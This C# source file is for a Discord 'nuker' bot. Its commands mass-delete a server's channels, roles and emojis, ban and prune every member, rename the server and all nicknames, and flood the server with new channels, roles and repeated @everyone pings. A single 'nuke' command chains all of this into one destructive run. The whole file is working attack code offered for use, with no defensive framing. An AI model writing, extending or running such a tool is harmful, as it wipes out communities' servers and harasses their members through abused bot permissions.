using Discord;
using Discord.Commands;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace DiscordNuker.NET.Commands
{
    public class NukeCommands : ModuleBase
    {
        //Look at trello board!

        [Command("mass chan", RunMode = RunMode.Async)]

        public async Task CreateChannels()
        {
            var dm = Context.Message.Author;
            await Discord.UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();
            Console.WriteLine("[-] Number of channels to make?");

            string input = Console.ReadLine();
            int num = Convert.ToInt32(input);

            Console.WriteLine("[-] Name of channels? (seperate with -)");
            string channame = Console.ReadLine();
            var count = Stopwatch.StartNew();
            count.Start();

            for (int i = 0; i < num; i++)
            {
                try
                {
                    await Context.Guild.CreateTextChannelAsync(channame);
                    Console.WriteLine("Created " + channame + " | " + i);
                }
                catch
                {
                    Console.WriteLine("Couldn't create " + channame);
                }

            }
            count.Stop();
            Console.WriteLine("Made " + num + " channels in " + count.ElapsedMilliseconds);
        }

        [Command("mass del", RunMode = RunMode.Async)]

        public async Task DelChannels()
        {
            var okay = new Emoji("👍");
            await Context.Message.AddReactionAsync(okay);

            foreach (var chan in await Context.Guild.GetChannelsAsync())
            {
                try
                {

                    await chan.DeleteAsync();
                    Console.WriteLine("Deleted " + chan);

                }
                catch
                {
                    Console.WriteLine("[x] Couldn't delete" + chan);
                }
            }
        }

        [Command("mass cate", RunMode = RunMode.Async)]

        public async Task CreateCategories()
        {
            var dm = Context.Message.Author;
            await Discord.UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();
            Console.WriteLine("[-] Number of categories to make?");
            string input = Console.ReadLine();
            int num = Convert.ToInt32(input);
            await Task.Delay(500);

            Console.WriteLine("[-] Name of channels?");
            string catename = Console.ReadLine();

            for (int i = 0; i < num; i++)
            {
                try
                {
                    await Context.Guild.CreateTextChannelAsync(catename);
                    Console.WriteLine("Created " + catename + " | " + i);
                }
                catch
                {
                    Console.WriteLine("Couldn't create " + catename);
                }
            }
        }

        [Command("mass vc", RunMode = RunMode.Async)]

        public async Task CreateVC()
        {

            var dm = Context.Message.Author;
            await Discord.UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();
            Console.WriteLine("[-] Number of voice channels to make?");
            string input = Console.ReadLine();
            int num = Convert.ToInt32(input);
            await Task.Delay(500);

            Console.WriteLine("[-] Name of channels?");
            string vcname = Console.ReadLine();

            for (int i = 0; i < num; i++)
            {
                try
                {
                    await Context.Guild.CreateTextChannelAsync(vcname);
                    Console.WriteLine("Created " + vcname + " | " + i);
                }
                catch
                {
                    Console.WriteLine("Couldn't create " + vcname);
                }
            }
        }

        [Command("mass ban", RunMode = RunMode.Async)]

        public async Task BanAll()
        {
            var okay = new Emoji("👍");
            await Context.Message.AddReactionAsync(okay);
            await Context.Guild.DownloadUsersAsync();
            foreach (var user in await Context.Guild.GetUsersAsync())
            {
                try
                {
                    await Context.Guild.AddBanAsync(user);
                    Console.WriteLine("Banned: " + user);
                    File.AppendAllText("NukerLogs.txt", DateTime.Now + " Banned: " + user + Environment.NewLine);
                }
                catch
                {
                    Console.WriteLine("Couldn't ban " + user);
                }

            }
        }

        [Command("mass mention", RunMode = RunMode.Async)]

        public async Task MentionAll()
        {
            var dm = Context.Message.Author;
            await UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();
            Console.WriteLine("[-] Message to say after the mention?");
            var msg = Console.ReadLine();

            foreach (var mem in await Context.Guild.GetUsersAsync())
            {
                try
                {
                    await ReplyAsync(mem.Mention + msg);
                    Console.WriteLine("Mentioned " + mem);
                }
                catch
                {
                    Console.WriteLine("Error mentionings " + mem.Username + " , possible rate limit?");
                }
            }
        }

        [Command("mass ping", RunMode = RunMode.Async)]

        public async Task PingAll()
        {
            var dm = Context.Message.Author;
            await UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();
            Console.WriteLine("[-] Message to send after @everyone?");
            var msg = Console.ReadLine();
            Console.WriteLine("[-] How many messages to send in each channel?");
            var repeat = Console.ReadLine();
            int num = Convert.ToInt32(repeat);
            for (int i = 0; i < num; i++)
            {
                foreach (var channel in await Context.Guild.GetTextChannelsAsync())
                {
                    try
                    {
                        await channel.SendMessageAsync("@everyone" + msg);
                        Console.WriteLine("Sent " + msg + " in " + channel + " , sending: " + num + " messages in every channel.");
                    }
                    catch
                    {
                        Console.WriteLine("Couldn't send " + msg + " in " + channel);
                    }

                }
            }

        }
        [Command("mass role", RunMode = RunMode.Async)]

        public async Task CreateRoles()
        {
            var dm = Context.Message.Author;
            await UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();

            Console.WriteLine("[-] Name of roles?");
            var name = Console.ReadLine();
            Console.WriteLine("[-] Number of roles to make?");
            var input = Console.ReadLine();
            int num = Convert.ToInt32(input);

            for (int i = 0; i < num; i++)
            {
                await Context.Guild.CreateRoleAsync(name, null, Color.Red, true, null);
                Console.WriteLine("Role created: " + name + " Roles made: " + i);
            }
        }

        [Command("mass del role", RunMode = RunMode.Async)]

        public async Task DeleteRoles()
        {
            var okay = new Emoji("👍");
            await Context.Message.AddReactionAsync(okay);
            foreach (var role in Context.Guild.Roles)
            {
                try
                {
                    await role.DeleteAsync();
                    Console.WriteLine("Deleted: " + role);
                }
                catch
                {
                    Console.WriteLine("Unable to delete " + role);
                }

            }
        }

        [Command("mass nickname", RunMode = RunMode.Async)]

        public async Task NicknameAll()
        {
            var dm = Context.Message.Author;
            await UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();

            Console.WriteLine("[-] What should I nickname the users?");
            var name = Console.ReadLine();
            await Context.Guild.DownloadUsersAsync();
            foreach (var user in await Context.Guild.GetUsersAsync())
            {
                try
                {
                    await user.ModifyAsync(rxversed =>
                    {
                        rxversed.Nickname = name;
                    });
                    Console.WriteLine("Set " + user + "'s nickname to " + name);
                }
                catch
                {
                    Console.WriteLine("[X] Couldn't nickname " + user + " " + name);
                }

            }
        }
        [Command("mass prune", RunMode = RunMode.Async)]

        public async Task PruneAll()
        {
            var dm = Context.Message.Author;
            await UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();
            Console.WriteLine("[-] Number of days? (days of not logged on)");
            var input = Console.ReadLine();
            int num = Convert.ToInt32(input);

            await Context.Guild.PruneUsersAsync(num);
        }

        [Command("unban all", RunMode = RunMode.Async)]

        public async Task Unban()
        {
            var okay = new Emoji("👍");
            await Context.Message.AddReactionAsync(okay);

            foreach (var user in await Context.Guild.GetBansAsync())
            {
                try
                {
                    await Context.Guild.RemoveBanAsync(user.User);
                    Console.WriteLine("Unbanned " + user);
                }
                catch
                {
                    Console.WriteLine("Couldn't unban " + user);
                }

            }
        }

        [Command("mass del emojis", RunMode = RunMode.Async)]

        public async Task DeleteEmojis()
        {
            foreach (var emoji in await Context.Guild.GetEmotesAsync())
            {
                var okay = new Emoji("👍");
                await Context.Message.AddReactionAsync(okay);
                try
                {
                    await Context.Guild.DeleteEmoteAsync(emoji);
                    Console.WriteLine("Deleted " + emoji.Name);
                }
                catch
                {
                    Console.WriteLine("Couldn't delete " + emoji.Name);
                }
            }

        }

        [Command("mass rename chan", RunMode = RunMode.Async)]

        public async Task Rename()
        {
            var dm = Context.Message.Author;
            await UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();
            Console.WriteLine("[-] Name of channels?");
            var name = Console.ReadLine();
            foreach (var chan in await Context.Guild.GetChannelsAsync())
            {
                await chan.ModifyAsync(rxversed =>
                {
                    rxversed.Name = name;
                });
            }
        }

        [Command("nuke", RunMode = RunMode.Async)]

        public async Task Destroy()
        {
            var dm = Context.Message.Author;
            await UserExtensions.SendMessageAsync(dm, "Check console.");
            await Context.Message.DeleteAsync();

            Console.WriteLine("[-] Name for channels?");
            var channame = Console.ReadLine();
            Console.WriteLine("[-] Name for roles?");
            var rolename = Console.ReadLine();
            Console.WriteLine("[-] Message to say after @everyone?");
            var pingname = Console.ReadLine();
            Console.WriteLine("[-] Name of server + nickname for everyone?");
            var servname = Console.ReadLine();

            #region Deletion
            foreach (var chan in await Context.Guild.GetChannelsAsync())
            {
                try
                {

                    await chan.DeleteAsync();
                    Console.WriteLine("Deleted " + chan);

                }
                catch
                {
                    Console.WriteLine("[x] Couldn't delete" + chan);
                }
            }

            foreach (var role in Context.Guild.Roles)
            {
                try
                {
                    await role.DeleteAsync();
                    Console.WriteLine("Deleted: " + role);
                }
                catch
                {
                    Console.WriteLine("Unable to delete " + role);
                }

            }

            foreach (var emoji in await Context.Guild.GetEmotesAsync())
            {
                var okay = new Emoji("👍");
                await Context.Message.AddReactionAsync(okay);
                try
                {
                    await Context.Guild.DeleteEmoteAsync(emoji);
                    Console.WriteLine("Deleted " + emoji.Name);
                }
                catch
                {
                    Console.WriteLine("Couldn't delete " + emoji.Name);
                }
            }

            await Context.Guild.ModifyAsync(rxversed =>
             {
                 rxversed.Name = servname;
             });

            foreach (var user in await Context.Guild.GetUsersAsync())
            {
                try
                {
                    await user.ModifyAsync(rxversed =>
                    {
                        rxversed.Nickname = servname;
                    });
                    Console.WriteLine("Set " + user + "'s nickname to " + servname);
                }
                catch
                {
                    Console.WriteLine("[X] Couldn't nickname " + user + " " + servname);
                }

            }

            #endregion Deletion
            await Task.Delay(2500);
            #region Creation
            for (int i = 0; i < 5; i++)
            {
                await Context.Guild.CreateRoleAsync(rolename, null, Color.Red, true, null);
                await Context.Guild.CreateRoleAsync(rolename, null, Color.Orange, true, null);
                await Context.Guild.CreateRoleAsync(rolename, null, Color.LightOrange, true, null);
                await Context.Guild.CreateRoleAsync(rolename, null, Color.Green, true, null);
                await Context.Guild.CreateRoleAsync(rolename, null, Color.Blue, true, null);
                await Context.Guild.CreateRoleAsync(rolename, null, Color.DarkPurple, true, null);
                await Context.Guild.CreateRoleAsync(rolename, null, Color.Purple, true, null);
                Console.WriteLine("Role created: " + rolename + " Roles made: " + i * 7);
            }

            for (int i = 0; i < 25; i++)
            {
                try
                {
                    await Context.Guild.CreateTextChannelAsync(channame);
                    Console.WriteLine("Created " + channame + " | " + i);
                }
                catch
                {
                    Console.WriteLine("Couldn't create " + channame);
                }

            }
            await Task.Delay(2500);
            for (int i = 0; i < 4; i++)
            {
                foreach (var channel in await Context.Guild.GetTextChannelsAsync())
                {
                    try
                    {
                        await channel.SendMessageAsync("@everyone" + pingname);
                        Console.WriteLine("Sent " + pingname + " in " + channel + " , sending: " + i + " messages in every channel.");
                    }
                    catch
                    {
                        Console.WriteLine("Couldn't send " + pingname + " in " + channel);
                    }

                }
            }
            #endregion Creation
        }
    }
}
